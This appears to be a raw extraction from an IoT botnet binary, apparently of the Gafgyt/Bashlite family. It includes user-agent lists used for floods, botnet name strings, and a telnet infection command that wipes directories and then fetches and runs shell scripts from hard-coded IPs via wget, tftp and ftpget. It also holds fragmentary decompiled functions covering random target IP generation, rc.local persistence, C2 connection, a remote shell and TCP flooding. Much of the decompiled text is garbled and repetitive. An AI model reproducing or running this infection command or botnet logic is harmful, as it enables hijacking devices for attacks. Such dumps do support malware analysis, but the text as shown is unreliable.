        "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)",
        "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)",
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
        "Rome Client (http://tinyurl.com/64t5n) Ver: 0.9",
        "Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)",
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
        "SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)",
        "Rome Client (http://tinyurl.com/64t5n) Ver: 0.9",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; http://www.bing.com/bingbot.htm)",
        "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.3; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1; AskTbCFTP2V5/5.14.1.20007)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.3",
        "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)",
        "HuaweiSymantecSpider/1.0+DSE-support@huaweisymantec.com+(compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR ; http://www.huaweisymantec.com/en/IRL/spider)",
        "Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620",
        "Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; 1 subscribers; feed-id=9422214874901413839)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; http://www.bing.com/bingbot.htm)",
        "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.3; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1; AskTbCFTP2V5/5.14.1.20007)",
        "Wget/1.12 (linux-gnu)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.3",
        "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)",
        "HuaweiSymantecSpider/1.0+DSE-support@huaweisymantec.com+(compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR ; http://www.huaweisymantec.com/en/IRL/spider)",
        "Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620",
        "Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; 1 subscribers; feed-id=9422214874901413839)",
        "wget",
        "botnet",
        "swatnet",
        "fucknet",
        "cracknet",
        "weednet",
        "gaynet",
        "queernet",
        "ballnet",
        "unet",
        "cd /tmp || cd /var/system || cd /mnt || cd /lib;rm -f /tmp/* || /var/run/* || /var/system/* || /mnt/* || /lib/*;cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.32.213.61/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 207.148.12.91 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 207.148.12.91; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 207.148.12.91 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n",
        "telnet",
        "telnet"
        "/dev/netslink/",
    __get_pc_thunk_bx(0);
=================FUNCTION : sysconf ===================
++++++++ FUNCTION START 46915
++++++++ FUNCTION END 47835
++++++++ FUNCTION LENGTH 920
        case 0: {
        case 1: {
        case 2: {
        case 3: {
        case 4: {
            getdtablesize();
        case 5: {
        case 6: {
        case 7: {
        case 8: {
        case 9: {
        case 10: {
        case 11: {
        case 12: {
        case 13: {
        case 14: {
        case 15: {
        case 16: {
        case 17: {
        case 18: {
        case 19: {
        case 20: {
        case 21: {
        case 22: {
        case 23: {
        case 24: {
        case 25: {
        case 26: {
        case 27: {
        case 28: {
        case 29: {
        case 30: {
            __GI_getpagesize((int32_t)&v138, (int32_t)&v138, (int32_t)&v138);
        case 31: {
        case 32: {
        case 33: {
        case 34: {
        case 35: {
        case 36: {
        case 37: {
        case 38: {
        case 39: {
        case 40: {
        case 41: {
        case 42: {
        case 43: {
        case 44: {
        case 45: {
        case 46: {
        case 47: {
        case 48: {
        case 49: {
        case 50: {
        case 51: {
        case 52: {
        case 53: {
        case 54: {
        case 55: {
        case 56: {
        case 57: {
        case 58: {
        case 59: {
        case 60: {
        case 61: {
        case 62: {
        case 63: {
        case 64: {
        case 65: {
        case 66: {
        case 67: {
        case 68: {
        case 69: {
        case 70: {
        case 71: {
        case 72: {
        case 73: {
        case 74: {
        case 75: {
        case 76: {
        case 77: {
        case 78: {
        case 79: {
        case 80: {
        case 81: {
        case 82: {
        case 83: {
        case 84: {
        case 85: {
        case 86: {
        case 87: {
        case 88: {
        case 89: {
        case 90: {
        case 91: {
        case 92: {
        case 93: {
        case 94: {
        case 95: {
        case 96: {
        case 97: {
        case 98: {
        case 99: {
        case 100: {
        case 101: {
        case 102: {
        case 103: {
        case 104: {
        case 105: {
        case 106: {
        case 107: {
        case 108: {
        case 109: {
        case 110: {
        case 111: {
        case 112: {
        case 113: {
        case 114: {
        case 115: {
        case 116: {
        case 117: {
        case 118: {
        case 119: {
        case 120: {
        case 121: {
        case 122: {
        case 123: {
        case 124: {
        case 125: {
        case 126: {
        case 127: {
        case 128: {
        case 129: {
        case 130: {
        case 131: {
        case 149: {
            if (__GI_clock_getres(1, NULL, 149, 149) >= 0) {
=================FUNCTION : GetRandomPublicIP ===================
++++++++ FUNCTION START 9034
++++++++ FUNCTION END 9890
++++++++ FUNCTION LENGTH 856
    int32_t v138 = random(); // 0x8049c24
    int32_t v140 = random(); // 0x8049c40
    int32_t v142 = random(); // 0x8049c5c
    int32_t v144 = random(); // 0x8049c78
    int32_t v146 = random(); // 0x8049c94
        szprintf(v149, (int32_t)"43.252.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v150, (int32_t)"43.239.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v151, (int32_t)"85.3.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v152, (int32_t)"37.158.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v153, (int32_t)"95.9.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v154, (int32_t)"41.252.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v155, (int32_t)"58.71.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v156, (int32_t)"104.55.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v157, (int32_t)"78.186.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v158, (int32_t)"78.189.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v159, (int32_t)"77.209.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v160, (int32_t)"88.5.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v161, (int32_t)"43.239.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v162, (int32_t)"103.20.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v163, (int32_t)"103.47.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v164, (int32_t)"103.57.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v165, (int32_t)"45.117.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v166, (int32_t)"101.51.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v167, (int32_t)"137.59.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v168, (int32_t)"1.56.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v169, (int32_t)"1.188.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v170, (int32_t)"14.204.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v171, (int32_t)"27.0.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v172, (int32_t)"27.8.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v173, (int32_t)"27.50.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v174, (int32_t)"27.54.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v175, (int32_t)"27.98.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v176, (int32_t)"27.112.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v177, (int32_t)"27.192.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v178, (int32_t)"36.32.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v179, (int32_t)"36.248.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v180, (int32_t)"39.64.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v181, (int32_t)"42.4.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v182, (int32_t)"42.48.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v183, (int32_t)"42.52.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v184, (int32_t)"42.56.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v185, (int32_t)"42.63.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v186, (int32_t)"42.84.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v187, (int32_t)"42.176.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v188, (int32_t)"42.224.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v189, (int32_t)"42.176.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v190, (int32_t)"60.0.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v191, (int32_t)"60.16.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v192, (int32_t)"163.53.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v193, (int32_t)"62.30.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v194, (int32_t)"62.252.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v195, (int32_t)"62.254.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v196, (int32_t)"62.255.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v197, (int32_t)"77.96.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v198, (int32_t)"77.97.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v199, (int32_t)"77.98.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v200, (int32_t)"77.100.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v201, (int32_t)"77.102.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v202, (int32_t)"113.191.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v203, (int32_t)"81.100.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v204, (int32_t)"113.188.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v205, (int32_t)"113.189.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v206, (int32_t)"94.174.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v207, (int32_t)"14.160.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v208, (int32_t)"14.161.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v209, (int32_t)"14.162.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v210, (int32_t)"14.163.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v211, (int32_t)"14.164.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v212, (int32_t)"14.165.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v213, (int32_t)"14.166.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v214, (int32_t)"14.167.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v215, (int32_t)"14.168.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v216, (int32_t)"14.169.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v217, (int32_t)"14.170.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v218, (int32_t)"14.171.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v219, (int32_t)"14.172.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v220, (int32_t)"14.173.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v221, (int32_t)"14.174.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v222, (int32_t)"14.175.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v223, (int32_t)"14.176.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v224, (int32_t)"14.177.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v225, (int32_t)"14.178.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v226, (int32_t)"14.179.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v227, (int32_t)"14.180.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v228, (int32_t)"14.181.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v229, (int32_t)"14.182.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v230, (int32_t)"14.183.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v231, (int32_t)"14.184.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v232, (int32_t)"14.185.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v233, (int32_t)"14.186.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v234, (int32_t)"14.187.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v235, (int32_t)"14.188.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v236, (int32_t)"14.189.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v237, (int32_t)"14.190.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v238, (int32_t)"14.191.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v239, (int32_t)"45.121.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v240, (int32_t)"45.120.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v241, (int32_t)"45.115.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v242, (int32_t)"43.252.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v243, (int32_t)"43.230.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v244, (int32_t)"43.240.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v245, (int32_t)"43.245.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v246, (int32_t)"41.174.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v247, (int32_t)"49.118.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v248, (int32_t)"78.188.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v249, (int32_t)"45.127.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v250, (int32_t)"103.30.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v251, (int32_t)"14.33.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v252, (int32_t)"123.16.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v253, (int32_t)"202.44.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v254, (int32_t)"116.93.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v255, (int32_t)"91.83.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v256, (int32_t)"41.253.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v257, (int32_t)"117.173.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v258, (int32_t)"113.190.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v259, (int32_t)"146.88.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v260, (int32_t)"112.196.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v261, (int32_t)"113.178.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v262, (int32_t)"112.45.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v263, (int32_t)"183.223.%d.%d", (int32_t)v136, (int32_t)v137);
        szprintf(v265, (int32_t)"43.230.%d.%d", (int32_t)v136, (int32_t)v137);
    return inet_addr(v264);
=================FUNCTION : main ===================
++++++++ FUNCTION START 19058
++++++++ FUNCTION END 19945
++++++++ FUNCTION LENGTH 887
    int32_t v140 = v139 ^ __libc_getpid(); // 0x804ef5d
    srand(v140);
    int32_t v142 = v141 ^ __libc_getpid(); // 0x804ef7f
    init_rand(v142);
    int32_t v144 = __GI_fopen((int32_t)"/etc/rc.d/rc.local", (int32_t)&v143); // 0x804efa3
        int32_t v147 = __GI_fopen((int32_t)"/etc/rc.conf", (int32_t)&v143); // 0x804efc6
        getcwd(v165, 256);
            __GI_fclose((int16_t *)v145);
            while (true) {
                    sprintf(v173, (int32_t)"\"%s%s\"\n", v165, v174 + v163);
                    while (true) {
                        while (true) {
                                fgets((int32_t)&v176, 1024, v145);
                                if (__GI_strcasecmp((char *)&v176, v173) == 0) {
                                __GI_fclose((int16_t *)v145);
                                int32_t v178 = __GI_fopen(v146, (int32_t)&v177); // 0x804f124
                                    __GI_fclose((int16_t *)v178);
                                getOurIP();
                                v160 = __libc_fork((int32_t)v137);
                                    if (__libc_fork((int32_t)v137) == 0) {
                                        v137 = "fork failed\n";
                                        zprintf((int32_t)"fork failed\n");
                                    while (true) {
                                        if (initConnection() != 0) {
                                            while (true) {
                                                if (initConnection() == 0) {
                                            __GI_inet_ntoa((int32_t)v137);
                                            getBuild();
                                            sockprintf((int32_t)v137, 1);
                                            while (true) {
                                                while (true) {
                                                    while (true) {
                                                        if (recvLine() == -1) {
                                                        while (true) {
                                                                        v194 = __libc_waitpid(v187, v184, v186);
                                                                            while (true) {
                                                                                        while (true) {
                                                                                                    free(0);
                                                                if (strstr(v192, (char *)&v200) != v161) {
                                                                    int32_t v201 = strstr(v192, (char *)&v200); // 0x804f4ed
                                                                        zprintf(v203);
                                                                            while (true) {
                                                                                while (true) {
                                                                                                while (true) {
                                                                                                    while (true) {
                                                                                                            while (true) {
                                                                                                            processCmd();
                                                                                                                free(v239);
                                                                                                                    free(v239);
                                                                                                                while (true) {
                                                                                                            while (true) {
                                                                                                        processCmd();
                                                                                                        if (listFork() != 0) {
                                                                                                        szprintf(3, (int32_t)"SH", v210, v210);
                                                                                                        int32_t v241 = fdpopen(); // 0x804f709
                                                                                                        while (true) {
                                                                                                            if (fdgets(v241, v180, v132) != 0) {
                                                                                                                sockprintf(v241, v180);
                                                                                                                fdpclose();
                                                                    sockprintf(v192, (int32_t)&v200);
                                                                while (true) {
                                                                    if (initConnection() == 0) {
                                                            v194 = __libc_waitpid(v187, v184, v186);
                                        __GI_inet_ntoa((int32_t)v137);
                                        getBuild();
                                        sockprintf((int32_t)v137, 1);
                                    __libc_waitpid(v160, (int32_t)&v149, 0);
                                    zprintf((int32_t)"fork failed\n");
                                while (true) {
                                    if (initConnection() == 0) {
        getOurIP();
        v160 = __libc_fork((int32_t)v137);
            if (__libc_fork((int32_t)v137) == 0) {
                v137 = "fork failed\n";
                zprintf((int32_t)"fork failed\n");
            while (true) {
                if (initConnection() == 0) {
            __libc_waitpid(v160, (int32_t)&v149, 0);
            zprintf((int32_t)"fork failed\n");
        while (true) {
            if (initConnection() == 0) {
    getOurIP();
    v160 = __libc_fork((int32_t)v137);
        if (__libc_fork((int32_t)v137) == 0) {
            v137 = "fork failed\n";
            zprintf((int32_t)"fork failed\n");
        while (true) {
            if (initConnection() == 0) {
        __libc_waitpid(v160, (int32_t)&v149, 0);
        zprintf((int32_t)"fork failed\n");
    while (true) {
        if (initConnection() == 0) {
=================FUNCTION : __dns_lookup ===================
++++++++ FUNCTION START 59284
++++++++ FUNCTION END 60465
++++++++ FUNCTION LENGTH 1181
                        while (true) {
                                __libc_close(-1);
                                    if (inet_pton(-1, (char *)v152, v154, (int32_t)&v147) >= 1) {
                                        inet_addr(-1);
                                    if (socket(-1, v152, v154) >= 0) {
                                        if (__libc_connect(-1, v152, v154) >= 0) {
                                            __libc_send(-1, v152, v154, (int32_t)&v147);
                                                int32_t v169 = __libc_recv(-1, v152, v154, (int32_t)&v147); // 0x80550b2
                                                                            __libc_close(v142);
                                                                        free(v143);
                                                                        free(v143);
                                                                            while (true) {
                                                                                        __libc_close(-1);
                                                                                            free(-1);
                                                                                            free(-1);
                                                                                        free(-1);
                                                                                        free(-1);
                                                                                                free(-1);
                                                                                                __libc_close(-1);
                                                                                                    free(-1);
                                                                                                    free(-1);
                                                                                                free(-1);
                                                                                                    __libc_close(-1);
                                                                                                        free(-1);
                                                                                                        free(-1);
                                                                                                    free(-1);
                                                                                                __libc_close(-1);
                                                                                                    free(-1);
                                                                                                    free(-1);
                                                                                                free(-1);
                                                                                            free(-1);
                                                                                            v208 = __libc_close(-1);
                                                                                                v209 = free(-1);
                                                                                                v210 = free(-1);
                                                                                            v210 = free(-1);
                                                                                    v208 = __libc_close(-1);
                                                                                        v209 = free(-1);
                                                                                        v210 = free(-1);
                                                                                    v210 = free(-1);
                                                                            __libc_close(-1);
                                                                                free(-1);
                                                                                free(-1);
                                                                            free(-1);
                                                                            free(-1);
                                                                        __libc_close(-1);
                                                                            free(-1);
                                                                            free(-1);
                                                                    __libc_close(-1);
                                                                        free(-1);
                                                                    __libc_close(v142);
                                                                free(v143);
                                                                free(v143);
                                                                __libc_close(v142);
                                                            free(v143);
                                                            free(v143);
                                    __libc_close(v142);
                                free(v143);
                                free(v143);
                                __libc_close(v142);
                            free(v143);
                            free(v143);
                    __libc_close(v142);
                free(v143);
                free(v143);
                __libc_close(v142);
            free(v143);
            free(v143);
            __libc_close(v142);
        free(v143);
        free(v143);
        __libc_close(v142);
    free(v143);
    free(v143);
=================FUNCTION : _fpmaxtostr ===================
++++++++ FUNCTION START 54133
++++++++ FUNCTION END 57594
++++++++ FUNCTION LENGTH 3461
        while (true) {
            while (true) {
                            while (true) {
                                                                    while (true) {
                                                                                    while (true) {
                                                                                while (true) {
                                                                    while (true) {
                                                                while (true) {
                                                            while (true) {
                                                            while (true) {
                                                        while (true) {
                                                            while (true) {
                                                            while (true) {
                                                        while (true) {
                                                        while (true) {
                                                        while (true) {
                                                    while (true) {
                                                            while (true) {
                                                            while (true) {
                                                        while (true) {
                                                    while (true) {
                                                    while (true) {
                                                while (true) {
                                                                        while (true) {
                                                                        while (true) {
                                                                    while (true) {
                                                                while (true) {
                                                                while (true) {
                                                            while (true) {
                                                                while (true) {
                                                                while (true) {
                                                            while (true) {
                                                            while (true) {
                                                            while (true) {
                                                        while (true) {
                                                                while (true) {
                                                                while (true) {
                                                            while (true) {
                                                        while (true) {
                                                        while (true) {
                                                            while (true) {
                                                    while (true) {
                                                        while (true) {
                                                while (true) {
                                                    while (true) {
                                            while (true) {
                        while (true) {
=================FUNCTION : fdpopen ===================
++++++++ FUNCTION START 4328
++++++++ FUNCTION END 4797
++++++++ FUNCTION LENGTH 469
                    v146 = __vfork(v141);
                        __libc_close(v138);
                        __libc_close(v140);
                            __libc_close(v138);
                            __libc_close(v140);
                            __libc_close(v138);
                        __libc_close(v140);
                            __libc_close(v140);
                        __libc_close(v138);
                v143 = getdtablesize();
                        v146 = __vfork(v141);
                            __libc_close(v138);
                            __libc_close(v140);
                                __libc_close(v138);
                                __libc_close(v140);
                                __libc_close(v138);
                            __libc_close(v140);
                                __libc_close(v140);
                            __libc_close(v138);
                    v146 = __vfork(v141);
                        __libc_close(v138);
                        __libc_close(v140);
                            __libc_close(v138);
                            __libc_close(v140);
                            __libc_close(v138);
                        __libc_close(v140);
                            __libc_close(v140);
                        __libc_close(v138);
                v143 = getdtablesize();
                        v146 = __vfork(v141);
                            __libc_close(v138);
                            __libc_close(v140);
                                __libc_close(v138);
                                __libc_close(v140);
                                __libc_close(v138);
                            __libc_close(v140);
                                __libc_close(v140);
                            __libc_close(v138);
=================FUNCTION : sendTCP ===================
++++++++ FUNCTION START 12510
++++++++ FUNCTION END 12972
++++++++ FUNCTION LENGTH 462
        rand_cmwc(v138);
